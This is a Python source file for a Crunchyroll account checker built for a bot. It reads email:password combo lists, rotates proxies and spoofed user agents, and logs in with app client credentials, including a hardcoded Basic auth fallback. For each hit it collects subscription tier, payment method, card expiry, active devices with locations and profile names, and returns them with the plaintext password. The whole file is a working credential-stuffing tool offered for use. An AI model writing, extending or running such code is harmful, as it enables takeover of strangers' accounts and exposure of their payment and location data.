# crunchyroll_checker.py  —  Bot-only edition
# Merged from Script 1 (class structure, ProxyPool, session reuse)
# and Script 2 (rich data extraction, credential caching, UA rotation).
# No terminal / argparse / ANSI code included.
import base64
import itertools
import json
import random
import re
import time
import uuid
import requests

from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from threading import Lock

# ─────────────────────────────────────────────
#  Proxy pool  (Script 1 — unchanged)
# ─────────────────────────────────────────────

_PROXY_ERRORS = (
    requests.exceptions.ProxyError,
    requests.exceptions.ConnectionError,
    requests.exceptions.ConnectTimeout,
    requests.exceptions.ReadTimeout,
)


def _normalize_proxy(raw: str) -> str:
    raw = raw.strip()
    if not raw:
        return ""
    if "://" not in raw:
        raw = "http://" + raw
    return raw


def parse_proxy_lines(text: str) -> list[str]:
    proxies = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        url = _normalize_proxy(line)
        if url:
            proxies.append(url)
    return proxies


def parse_combo_lines(text: str) -> list[tuple[str, str]]:
    combos: list[tuple[str, str]] = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            continue
        user, pw = line.split(":", 1)
        user, pw = user.strip(), pw.strip()
        if user and pw:
            combos.append((user, pw))
    return combos


class ProxyPool:
    def __init__(self, proxy_urls: list[str]):
        self._all: list[str] = list(proxy_urls)
        self._alive: list[str] = list(proxy_urls)
        self._dead: set[str] = set()
        self._cycle = itertools.cycle(self._alive) if self._alive else iter([])
        self._lock = Lock()

    def _rebuild_cycle(self):
        self._cycle = itertools.cycle(self._alive) if self._alive else iter([])

    def next(self) -> str | None:
        with self._lock:
            if not self._alive:
                return None
            for _ in range(len(self._alive)):
                proxy = next(self._cycle, None)
                if proxy and proxy not in self._dead:
                    return proxy
            return None

    def mark_dead(self, proxy: str):
        with self._lock:
            if proxy in self._alive:
                self._alive.remove(proxy)
                self._dead.add(proxy)
                self._rebuild_cycle()

    def revive_all(self):
        with self._lock:
            self._alive = list(self._all)
            self._dead.clear()
            self._rebuild_cycle()

    def load(self, proxy_urls: list[str]):
        with self._lock:
            self._all = list(proxy_urls)
            self._alive = list(proxy_urls)
            self._dead.clear()
            self._rebuild_cycle()

    @property
    def stats(self) -> tuple[int, int, int]:
        with self._lock:
            return len(self._alive), len(self._dead), len(self._all)

    def is_empty(self) -> bool:
        with self._lock:
            return len(self._alive) == 0

    def __len__(self) -> int:
        alive, _, _ = self.stats
        return alive


# ─────────────────────────────────────────────
#  Credential cache  (module-level, thread-safe)
# ─────────────────────────────────────────────

_cred_lock = Lock()
_cached_client_id: str = ""
_cached_basic_auth: str = ""
_cred_fetched_at: float = 0.0
_CRED_TTL: float = 3600.0

_FALLBACK_BASIC = "Basic cmpzMGx0eDBkYndrbGl3eGR6ZGY6NFY3cmYyMS1VRlhlWi01WEFkMFhfUVB3cjFndV9pMXM="
_FALLBACK_ID = "rjs0ltx0dbwkliwxdzdf"

_CRED_URLS = [
    "https://raw.githubusercontent.com/vitalygashkov/crextractor/main/credentials.tv.json",
    "https://raw.githubusercontent.com/vitalygashkov/crextractor/main/credentials.mobile.json",
]


def _fetch_credentials_from_github() -> tuple[str, str]:
    for url in _CRED_URLS:
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                creds = resp.json()
                cid = creds.get("client_id", "")
                auth = creds.get("authorization", "")
                if auth and not auth.startswith("Basic "):
                    auth = "Basic " + auth.strip()
                if cid and auth:
                    return cid, auth
        except Exception:
            continue
    return _FALLBACK_ID, _FALLBACK_BASIC


def get_credentials(force_refresh: bool = False) -> tuple[str, str]:
    global _cached_client_id, _cached_basic_auth, _cred_fetched_at
    with _cred_lock:
        now = time.monotonic()
        if force_refresh or not _cached_basic_auth or (now - _cred_fetched_at) > _CRED_TTL:
            _cached_client_id, _cached_basic_auth = _fetch_credentials_from_github()
            _cred_fetched_at = now
        return _cached_client_id, _cached_basic_auth


# Pre-warm credentials on import
try:
    get_credentials()
except Exception:
    pass


# ─────────────────────────────────────────────
#  Constants
# ─────────────────────────────────────────────

_USER_AGENTS = [
    "Crunchyroll/3.79.1 Android/14 okhttp/4.12.0",
    "Crunchyroll/3.80.0 Android/15 okhttp/4.12.0",
    "Crunchyroll/3.78.2 Android/14 okhttp/4.12.0",
    "AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)",
    "Dalvik/2.1.0 (Linux; U; Android 14; SM-S918B Build/UP1A.231005.007)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
]

_CYCLE_MAP = {"P1Y": "Yearly", "P1M": "Monthly", "P3M": "3 Months", "P6M": "6 Months"}

_LOCALE_MAP = {
    "en-US": "English", "en-GB": "English (UK)",
    "es-419": "Spanish (Latin America)", "es-ES": "Spanish (Spain)",
    "pt-BR": "Portuguese (Brazil)", "pt-PT": "Portuguese (Portugal)",
    "fr-FR": "French", "de-DE": "German", "it-IT": "Italian",
    "ru-RU": "Russian", "ar-ME": "Arabic", "ar-SA": "Arabic",
    "zh-CN": "Chinese (Simplified)", "zh-TW": "Chinese (Traditional)",
    "ja-JP": "Japanese", "ko-KR": "Korean", "hi-IN": "Hindi",
    "tr-TR": "Turkish", "pl-PL": "Polish", "nl-NL": "Dutch",
    "sv-SE": "Swedish", "fi-FI": "Finnish", "nb-NO": "Norwegian",
    "da-DK": "Danish", "ro-RO": "Romanian", "hu-HU": "Hungarian",
    "cs-CZ": "Czech", "sk-SK": "Slovak", "uk-UA": "Ukrainian",
    "id-ID": "Indonesian", "ms-MY": "Malay", "th-TH": "Thai",
    "vi-VN": "Vietnamese", "fil-PH": "Filipino",
}


# ─────────────────────────────────────────────
#  CrunchyrollChecker class  (Script 1 structure + Script 2 data richness)
# ─────────────────────────────────────────────

class CrunchyrollChecker:
    """
    One instance per account check.
    Uses a persistent Session (Script 1 pattern) for TCP connection reuse.
    Returns a rich result dict (Script 2 format) compatible with the bot.
    """

    def __init__(self, email: str, password: str, proxy_url: str | None = None):
        self.email = email
        self.password = password
        self.session = requests.Session()
        self.session.timeout = (5, 12)
        if proxy_url:
            self.session.proxies = {"http": proxy_url, "https": proxy_url}
        self.device_id = str(uuid.uuid4())
        self.user_agent = random.choice(_USER_AGENTS)
        self.access_token: str | None = None
        self.external_id: str | None = None
        self.web_token: str | None = None
        self.account_id: str | None = None

    # ── Internal helpers ──────────────────────────────────────────────

    def _base_headers(self) -> dict:
        return {
            "Host": "beta-api.crunchyroll.com",
            "User-Agent": self.user_agent,
            "etp-anonymous-id": self.device_id,
            "x-datadog-sampling-priority": "0",
            "Accept-Encoding": "gzip",
        }

    def _bearer_headers(self) -> dict:
        return {
            **self._base_headers(),
            "Authorization": f"Bearer {self.access_token}",
            "etp-anonymous-id": str(uuid.uuid4()),
        }

    def _get(self, url: str) -> requests.Response:
        return self.session.get(url, headers=self._bearer_headers())

    # ── Step 1: Login ─────────────────────────────────────────────────

    def login(self, client_id: str, basic_auth: str) -> tuple[bool, str]:
        auth_header = basic_auth if basic_auth.startswith("Basic ") else f"Basic {basic_auth}"
        headers = {
            **self._base_headers(),
            "Authorization": auth_header,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {
            "grant_type": "password",
            "username": self.email,
            "password": self.password,
            "scope": "offline_access",
            "client_id": client_id,
            "device_type": "SamsungTV",
            "device_id": self.device_id,
            "device_name": "Goku",
        }
        resp = self.session.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            headers=headers, data=data,
        )
        if resp.status_code == 200:
            token = resp.json().get("access_token")
            if token:
                self.access_token = token
                return True, "ok"
            return False, "no_token"
        if resp.status_code == 401:
            body = resp.text.lower()
            if "client_inactive" in body or "invalid_client" in body:
                return False, "client_inactive"
            return False, "invalid_credentials"
        if resp.status_code == 429:
            return False, "rate_limited"
        return False, f"http_{resp.status_code}"

    # ── Step 2: Account info ──────────────────────────────────────────

    def fetch_account(self) -> tuple[bool, dict]:
        resp = self._get("https://beta-api.crunchyroll.com/accounts/v1/me")
        if resp.status_code != 200:
            return False, {}
        data = resp.json()
        print(f"[DEBUG] account keys={list(data.keys())} external_id={data.get('external_id')} account_id={data.get('account_id')} id={data.get('id')}")
        self.external_id = data.get("external_id", "")
        self.account_id = data.get("account_id") or data.get("id") or self.external_id
        return True, data

    # ── Step 3: Subscription ──────────────────────────────────────────

    def fetch_subscription(self) -> tuple[bool, dict]:
        if not self.external_id:
            return False, {}
        resp = self._get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{self.external_id}"
        )
        if resp.status_code == 200:
            return True, resp.json()
        return False, {}

    # ── Step 4: Products ──────────────────────────────────────────────

    def fetch_products(self) -> tuple[bool, dict]:
        if not self.external_id:
            return False, {}
        resp = self._get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{self.external_id}/products"
        )
        if resp.status_code == 200:
            items = resp.json().get("items", [])
            if items:
                return True, items[0]
        return False, {}

    # ── Step 5: Benefits (concurrent streams / plan tier) ─────────────

    def fetch_benefits(self) -> str:
        if not self.external_id:
            return ""
        resp = self._get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{self.external_id}/benefits"
        )
        return resp.text if resp.status_code == 200 else ""

    # ── Step 6: Profiles ──────────────────────────────────────────────

    def fetch_profiles(self) -> tuple[bool, dict]:
        if self.web_token:
            resp = self._web_get("https://www.crunchyroll.com/accounts/v1/me/multiprofile")
            if resp.status_code == 200:
                return True, resp.json()
        resp = self._get("https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile")
        if resp.status_code == 200:
            return True, resp.json()
        return False, {}

    def fetch_web_subscription(self) -> tuple[bool, dict]:
        if not self.account_id or not self.web_token:
            print(f"[DEBUG] fetch_web_subscription skipped: account_id={self.account_id}")
            return False, {}
        url = f"https://www.crunchyroll.com/subs/v4/accounts/{self.account_id}/subscriptions"
        resp = self._web_get(url)
        print(f"[DEBUG] web_subs status={resp.status_code} body={resp.text[:300]}")
        if resp.status_code == 200:
            return True, resp.json()
        return False, {}

    def fetch_devices(self) -> tuple[bool, list]:
        if not self.account_id or not self.web_token:
            return False, []
        url = f"https://www.crunchyroll.com/accounts/v1/{self.account_id}/devices/active"
        resp = self._web_get(url)
        print(f"[DEBUG] devices url={url} status={resp.status_code}")
        if resp.status_code == 200:
            data = resp.json()
            return True, data.get("items", [])
        return False, []

    def fetch_web_payment_methods(self) -> tuple[bool, dict]:
        if not self.web_token:
            return False, {}
        resp = self._web_get("https://www.crunchyroll.com/v1/paymentMethods")
        if resp.status_code == 200:
            return True, resp.json()
        return False, {}

    # Remove this method entirely, or fix it:
    def fetch_web_billing_history(self) -> tuple[bool, dict]:
        if not self.web_token:
            return False, {}
        resp = self._web_get("https://www.crunchyroll.com/v1/billingHistory")
        if resp.status_code == 200:
            return True, resp.json()
        return False, {}

    def _decode_jwt_benefits(self) -> dict:
        if not self.web_token:
            return {}
        try:
            payload = self.web_token.split(".")[1]
            payload += "=" * (4 - len(payload) % 4)
            data = json.loads(base64.urlsafe_b64decode(payload))
            print(f"[DEBUG] JWT payload keys={list(data.keys())}")
            print(f"[DEBUG] JWT full={json.dumps(data, indent=2)}")
            return data
        except Exception as e:
            print(f"[DEBUG] JWT decode error: {e}")
            return {}


    def login_web(self) -> bool:
        try:
            # Use web-specific client credentials
            WEB_CLIENT_ID = "cr_web"
            WEB_BASIC_AUTH = "Basic "  # leave as-is, use existing basic_auth
            
            _, basic_auth = get_credentials()
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": basic_auth,
                "Origin": "https://www.crunchyroll.com",
                "Referer": "https://www.crunchyroll.com/",
            }
            data = {
                "grant_type": "password",
                "username": self.email,
                "password": self.password,
                "scope": "offline_access",
                "client_id": "cr_web",   # ← key change
                "device_type": "Chrome on Windows",
                "device_id": self.device_id,
            }
            resp = self.session.post(
                "https://beta-api.crunchyroll.com/auth/v1/token",
                headers=headers,
                data=data,
            )
            print(f"[DEBUG] login_web status={resp.status_code} body={resp.text[:200]}")
            if resp.status_code == 200:
                token = resp.json().get("access_token")
                if token:
                    self.web_token = token
                    return True
            if resp.status_code == 401:
                body = resp.text.lower()
                if "client_inactive" in body or "invalid_client" in body:
                    client_id, basic_auth = get_credentials(force_refresh=True)
                    headers["Authorization"] = basic_auth
                    data["client_id"] = client_id
                    resp2 = self.session.post(
                        "https://beta-api.crunchyroll.com/auth/v1/token",
                        headers=headers,
                        data=data,
                    )
                    if resp2.status_code == 200:
                        token = resp2.json().get("access_token")
                        if token:
                            self.web_token = token
                            return True
        except Exception as e:
            print(f"[DEBUG] login_web exception: {e}")
        return False

    def _web_headers(self) -> dict:
        return {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Authorization": f"Bearer {self.web_token}",
            "Origin": "https://www.crunchyroll.com",
            "Referer": "https://www.crunchyroll.com/",
        }

    def _web_get(self, url: str) -> requests.Response:
        return self.session.get(url, headers=self._web_headers())

    # ── Full check → rich dict ────────────────────────────────────────

    def run_check(self) -> dict:
        result: dict = {
            "email": self.email, "password": self.password,
            "success": False, "message": "",
            "email_verified": "No", "account_creation": "",
            "profile_names": [], "plan": "None",
            "currency": "N/A", "subscribable": "False",
            "free_trial": "False", "expiry": "",
            "active": "False", "country": "ZZ",
            "username": "Unknown", "plan_sub": "Unknown",
            "max_streams": "Unknown", "payment_method": "Unknown",
            "auto_renewal": "N/A", "subscription_start": "N/A",
            "billing_interval": "N/A", "profile_count": "N/A",
            "preferred_language": "N/A", "next_download": "N/A",
            "birthday": "N/A", "gender": "N/A",
            "receive_promos": "No", "token_expiry": "N/A",
            "device_type": "N/A", "device_name": "N/A",
            "last_updated": "N/A",
            #new
            "source": "N/A",
            "payment_info": "N/A",
            "payment_status": "N/A",
            "card_expiry": "N/A",
            "plan_type": "N/A",
            "plan_price": "N/A",
            "max_profiles": "N/A",
            "connected_devices": "N/A",
            "display_name": "N/A",
            #new
            "sub_status": "N/A",
            "last_payment": "N/A",
            "last_billed": "N/A",
            "last_active_device": "N/A",
            "last_active": "N/A",
        }

        client_id, basic_auth = get_credentials()
        max_attempts = 3

        for attempt in range(max_attempts):
            ok, reason = self.login(client_id, basic_auth)

            if not ok:
                if reason == "client_inactive":
                    client_id, basic_auth = get_credentials(force_refresh=True)
                    continue
                if reason == "invalid_credentials":
                    result["message"] = "Invalid email or password"
                    return result
                if reason == "rate_limited":
                    time.sleep(2 + attempt)
                    continue
                if attempt < max_attempts - 1:
                    time.sleep(1)
                    continue
                result["message"] = f"Login failed ({reason})"
                return result

            # ── Round 2: account info (need external_id first) ────────
            ok, acc = self.fetch_account()
            if not ok:
                result["message"] = "Account fetch failed"
                return result
            
            ok_web = self.login_web()
            print(f"[DEBUG] web_login={ok_web}, web_token={'set' if self.web_token else 'None'}")
            jwt_data = self._decode_jwt_benefits() if ok_web else {}
            result["email_verified"] = "Yes" if acc.get("email_verified") else "No"
            created = acc.get("created", "")
            if created:
                result["account_creation"] = created.split("T")[0]

            # ── Round 3: fire subscription + products + benefits + profiles IN PARALLEL ──
            #    All 4 are independent once we have access_token + external_id.
            with ThreadPoolExecutor(max_workers=7) as pool:
                f_subs     = pool.submit(self.fetch_subscription)
                f_products = pool.submit(self.fetch_products)
                f_benefits = pool.submit(self.fetch_benefits)
                f_profiles = pool.submit(self.fetch_profiles)
                f_devices     = pool.submit(self.fetch_devices)
                f_web_subs    = pool.submit(self.fetch_web_subscription)
                f_web_pay     = pool.submit(self.fetch_web_payment_methods)

                ok_subs,  subs        = f_subs.result()
                ok_prods, prod_item   = f_products.result()
                benefits_text         = f_benefits.result()
                ok_prof,  profile_data= f_profiles.result()
                ok_dev,   dev_data     = f_devices.result()   
                ok_wsubs, web_subs     = f_web_subs.result()
                ok_wpay,  web_pay      = f_web_pay.result()

            # ── Parse subscription ────────────────────────────────────
            sub_start_found = False
            auto_renewal_found = False
            payment_found = False

            if ok_subs and subs:
                result["active"] = "Yes" if subs.get("is_active") else "No"
                nr = subs.get("next_renewal_date", "")
                result["expiry"] = nr.split("T")[0] if nr else ""
                result["country"] = subs.get("subscription_country") or subs.get("country_code", "ZZ")
                result["currency"] = subs.get("currency_code", "N/A")
                result["billing_interval"] = _CYCLE_MAP.get(subs.get("cycle_duration", ""), "N/A")

                for prod in subs.get("subscription_products", []):
                    if not sub_start_found:
                        for dk in ("effective_date", "start_date", "startDate", "created", "purchase_date"):
                            v = prod.get(dk, "")
                            if v:
                                result["subscription_start"] = v.split("T")[0]
                                sub_start_found = True
                                break
                    if not auto_renewal_found:
                        ic = prod.get("is_cancelled")
                        if ic is not None:
                            result["auto_renewal"] = "No" if ic else "Yes"
                            auto_renewal_found = True
                    if not payment_found:
                        for k in ("paymentMethod", "payment_method", "store", "paymentMethodType"):
                            v = prod.get(k, "")
                            if v:
                                result["payment_method"] = str(v).replace("_", " ").title()
                                payment_found = True
                                break

                for sub_item in subs.get("subscriptions", []):
                    if not sub_start_found:
                        for dk in ("startDate", "start_date", "effective_date", "created", "purchase_date"):
                            v = sub_item.get(dk, "")
                            if v:
                                result["subscription_start"] = v.split("T")[0]
                                sub_start_found = True
                                break
                    if not auto_renewal_found:
                        qualifier = sub_item.get("subscriptionQualifier", sub_item.get("subscription_qualifier", ""))
                        cancel_at = sub_item.get("cancelAtPeriodEnd", sub_item.get("cancel_at_period_end"))
                        ic = sub_item.get("is_cancelled")
                        if qualifier:
                            result["auto_renewal"] = "Yes" if qualifier == "RECURRING" else "No"
                            auto_renewal_found = True
                        elif cancel_at is not None:
                            result["auto_renewal"] = "No" if cancel_at else "Yes"
                            auto_renewal_found = True
                        elif ic is not None:
                            result["auto_renewal"] = "No" if ic else "Yes"
                            auto_renewal_found = True
                    if not payment_found:
                        for k in ("paymentMethod", "payment_method", "paymentMethodType", "store"):
                            v = sub_item.get(k, "")
                            if v:
                                result["payment_method"] = str(v).replace("_", " ").title()
                                payment_found = True
                                break

                if not sub_start_found:
                    for dk in ("start_date", "startDate", "effective_date", "created"):
                        v = subs.get(dk, "")
                        if v:
                            result["subscription_start"] = v.split("T")[0]
                            sub_start_found = True
                            break
                if not auto_renewal_found:
                    for k in ("auto_renewal", "autoRenewal", "is_auto_renew", "autoRenew"):
                        v = subs.get(k)
                        if v is not None:
                            result["auto_renewal"] = "Yes" if v else "No"
                            auto_renewal_found = True
                            break

                if not sub_start_found:
                    try:
                        days = {"Yearly": 365, "Monthly": 30, "3 Months": 90, "6 Months": 180}.get(result["billing_interval"])
                        if result["expiry"] and days:
                            exp = datetime.strptime(result["expiry"], "%Y-%m-%d")
                            result["subscription_start"] = (exp - timedelta(days=days)).strftime("%Y-%m-%d")
                        else:
                            result["subscription_start"] = "N/A"
                    except Exception:
                        result["subscription_start"] = "N/A"

            # ── Parse web subscription (v4) ───────────────────────────
            if ok_wsubs and web_subs:
                print(f"[DEBUG] web_subs keys={list(web_subs.keys())}")
                print(f"[DEBUG] subs_list={web_subs.get('subscriptions', [])[:1]}")
                # Payment method
                pm = web_subs.get("currentPaymentMethod", {})
                print(f"[DEBUG] pm full={json.dumps(pm)}")
                if pm:
                    result["payment_info"] = pm.get("name", "N/A")
                    result["payment_status"] = pm.get("status", "N/A").title()
                    result["card_expiry"] = pm.get("expiresAt", "N/A") 
                    pm_type = pm.get("paymentMethodType", "")
                    if pm_type:
                        result["source"] = pm_type.replace("_", " ").title()

                # Plan details from subscriptions array
                subs_list = web_subs.get("subscriptions", [])
                if subs_list:
                    print(f"[DEBUG] plan full={json.dumps(subs_list[0].get('plan', {}))}")
                    sub = subs_list[0]
                    plan = sub.get("plan", {})
                    price = plan.get("price", {})
                    result["plan_price"] = price.get("text", "N/A")
                    result["plan_type"] = plan.get("planType", "N/A").title() 
                    result["sub_status"] = sub.get("status", "N/A").title()
                    result["last_payment"] = web_subs.get("latestInvoice", {}) \
                                                    .get("amount", {}).get("text", "N/A")
                    result["last_billed"] = web_subs.get("latestInvoice", {}) \
                                                    .get("created", "N/A").split("T")[0] 
                    tier = plan.get("tier", {})
                    if tier.get("text"):
                        result["plan_sub"] = tier["text"].upper() + " MEMBER"
                    # Max streams from benefits
                    for benefit in plan.get("benefits", []):
                        name = benefit.get("name", "")
                        if name.startswith("concurrent_streams."):
                            streams = name.split(".")[1]
                            result["max_streams"] = streams
                        if name.startswith("profile."):
                            result["max_profiles"] = name.split(".")[1]

            # ── Parse web payment methods ─────────────────────────────
            if ok_wpay and web_pay:
                print(f"[DEBUG] web_pay raw={json.dumps(web_pay)[:500]}")
                methods = web_pay.get("paymentMethods", [])
                if methods:
                    m = methods[0]
                    result["payment_info"] = m.get("name", result["payment_info"])
                    result["payment_status"] = m.get("status", result["payment_status"]).title()
                    result["source"] = m.get("type", result["source"]).replace("creditCard", "Credit Card")

            # ── Parse products ────────────────────────────────────────
            if ok_prods and prod_item:
                product = prod_item.get("product", {})
                result["plan"] = product.get("sku", "None")
                result["currency"] = prod_item.get("currency_code") or result["currency"]
                result["subscribable"] = "Yes" if product.get("is_subscribable") else "False"
                result["free_trial"] = "Yes" if prod_item.get("active_free_trial") else "False"

            if not auto_renewal_found:
                plan_sku = result.get("plan", "").lower()
                if any(x in plan_sku for x in ("year", "annual", "month", "fan", "recurring", "pack")):
                    result["auto_renewal"] = "Yes"

            if not payment_found:
                plan_sku = result.get("plan", "").lower()
                if "apple" in plan_sku or "ios" in plan_sku:
                    result["payment_method"] = "Apple Store"
                elif "google" in plan_sku or "android" in plan_sku:
                    result["payment_method"] = "Google Play"
                elif "amazon" in plan_sku:
                    result["payment_method"] = "Amazon"
                elif result.get("currency") not in ("N/A", "", None):
                    result["payment_method"] = "Card / Web"
                else:
                    result["payment_method"] = "N/A"

            # ── Parse benefits ────────────────────────────────────────
            if benefits_text:
                m = re.search(r'"benefit":"concurrent_streams\.(\d+)"', benefits_text)
                if m:
                    streams = m.group(1)
                    tiers = {
                        "6": ("ULTIMATE FAN MEMBER", "6"),
                        "4": ("MEGA FAN MEMBER", "4"),
                        "1": ("FAN MEMBER", "1"),
                    }
                    tier = tiers.get(streams, (f"UNKNOWN ({streams})", streams))
                    result["plan_sub"], result["max_streams"] = tier

            # ── Parse JWT token data ──────────────────────────────────
            if jwt_data:
                benefits_list = jwt_data.get("benefits", [])
                
                for benefit in benefits_list:
                    # Concurrent streams → plan tier
                    if benefit.startswith("concurrent_streams."):
                        streams = benefit.split(".")[1]
                        tiers = {
                            "6": ("ULTIMATE FAN MEMBER", "6"),
                            "4": ("MEGA FAN MEMBER", "4"),
                            "1": ("FAN MEMBER", "1"),
                        }
                        tier = tiers.get(streams, (f"UNKNOWN ({streams})", streams))
                        if result["plan_sub"] == "Unknown":
                            result["plan_sub"] = tier[0]
                        if result["max_streams"] == "Unknown":
                            result["max_streams"] = tier[1]
                    
                    # Max profiles
                    if benefit.startswith("profile.") and result["max_profiles"] == "N/A":
                        result["max_profiles"] = benefit.split(".")[1]
                
                # Token expiry
                exp = jwt_data.get("exp")
                if exp:
                    result["token_expiry"] = datetime.utcfromtimestamp(exp).strftime("%Y-%m-%d %H:%M UTC")
                
                # Subscription info from JWT
                sub_info = jwt_data.get("subscription", {})
                if sub_info:
                    if result["plan_type"] == "N/A":
                        result["plan_type"] = sub_info.get("planType", "N/A").title()
                    if result["sub_status"] == "N/A":
                        result["sub_status"] = sub_info.get("status", "N/A").title()

            # ── Parse profiles ────────────────────────────────────────
            if ok_prof and profile_data:
                profiles = profile_data.get("profiles", [])
                result["profile_count"] = str(len(profiles))
                names = []
                for p in profiles:
                    name = (p.get("profile_name") or p.get("name")
                            or p.get("username") or p.get("profile_id", ""))
                    if name:
                        names.append(f"{name} 👶" if p.get("is_kid_profile") else name)
                result["profile_names"] = names
                # Fix: read directly from dict, not from str(dict) which uses single quotes
                # Username can live at the top level or inside each profile
                max_p = profile_data.get("max_profiles") or profile_data.get("tier_max_profiles")
                if max_p:
                    result["max_profiles"] = str(max_p)
                u = profile_data.get("username")
                if not u:
                    for p in profiles:
                        u = p.get("username") or p.get("profile_name") or p.get("name")
                        if u:
                            break
                if u:
                    result["username"] = u
                # Language lives inside each profile object
                for p in profiles:
                    lang = (p.get("preferred_content_audio_language")
                            or p.get("preferred_content_subtitle_language"))
                    if lang:
                        result["preferred_language"] = _LOCALE_MAP.get(lang, lang)
                        break

            # ── Parse devices ─────────────────────────────────────────
            if ok_dev and dev_data:
                result["connected_devices"] = str(len(dev_data))
                # Find most recently used device
                try:
                    latest = max(dev_data, key=lambda d: d.get("last_used", ""))
                    dtype = latest.get("device_type") or latest.get("client_id", "Unknown")
                    city = latest.get("location", {}).get("city", "")
                    country = latest.get("location", {}).get("country", "")
                    loc = f"({city}, {country})" if city else f"({country})"
                    result["last_active_device"] = f"{dtype} {loc}".strip()
                    result["last_active"] = latest.get("last_used", "N/A")[:10]
                except Exception:
                    pass

            # ── Parse max profiles ────────────────────────────────────
            if benefits_text and result["max_profiles"] == "N/A":
                m2 = re.search(r'"benefit":"profile\.(\d+)"', benefits_text)
                if m2:
                    result["max_profiles"] = m2.group(1)

            # ── Display name from account ─────────────────────────────
            result["display_name"] = acc.get("display_name") or acc.get("name") or result["username"]

            # ── Final verdict ─────────────────────────────────────────────
            # Use JWT as authoritative fallback (www.crunchyroll.com 403s on Railway)
            if jwt_data.get("status") == "ACTIVE":
                result["active"] = "Yes"

            if result["active"] == "Yes":
                result["success"] = True
                result["message"] = "ACTIVE SUBSCRIPTION!"
            else:
                result["message"] = "Valid account but no paid plan"

            print(f"[DEBUG] source={result['source']} payment_info={result['payment_info']} devices={result['connected_devices']} display={result['display_name']}")
            return result

        result["message"] = "Temporary API error — try again"
        return result


# ─────────────────────────────────────────────
#  Public API — drop-in for bot import
# ─────────────────────────────────────────────

def check_crunchyroll(email: str, password: str, proxy: str | None = None, stop_event=None) -> dict:
    if stop_event and stop_event.is_set():
        raise InterruptedError("Stopped")

    checker = CrunchyrollChecker(email, password, proxy_url=proxy)
    try:
        return checker.run_check()
    except _PROXY_ERRORS as e:
        return {
            "email": email, "password": password,
            "success": False, "message": f"Proxy error: {e}",
        }
    except Exception as e:
        return {
            "email": email, "password": password,
            "success": False, "message": f"Error: {str(e)[:80]}",
        }
    finally:
        checker.session.close()
